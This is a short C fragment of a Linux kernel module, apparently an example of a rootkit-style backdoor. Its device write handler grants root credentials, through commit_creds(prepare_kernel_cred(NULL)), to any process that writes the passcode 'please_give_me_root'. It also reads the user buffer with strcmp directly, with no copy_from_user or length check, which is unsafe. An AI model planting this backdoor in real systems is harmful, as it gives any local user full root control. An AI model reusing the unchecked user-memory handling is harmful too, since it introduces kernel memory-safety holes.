#include <linux/cred.h>
#include <linux/uaccess.h>

#define PLEASE_GIVE_ME_ROOT "please_give_me_root"

// device write function for the character node file operations
ssize_t device_write(struct file *fp, const char *buf, size_t count, loff_t *offp) {
	// if input is the passcode
	if (!strcmp(buf, PLEASE_GIVE_ME_ROOT)) {
		// make a struct cred credentials with effective uid and gid of 0 (root)
		// commit those creds to the current running process (insert into task_struct)
		// note that in file operations writing, we are always running in the context of the process who tried to write into the node
		commit_creds(prepare_kernel_cred(NULL));
	}

	return count;
}
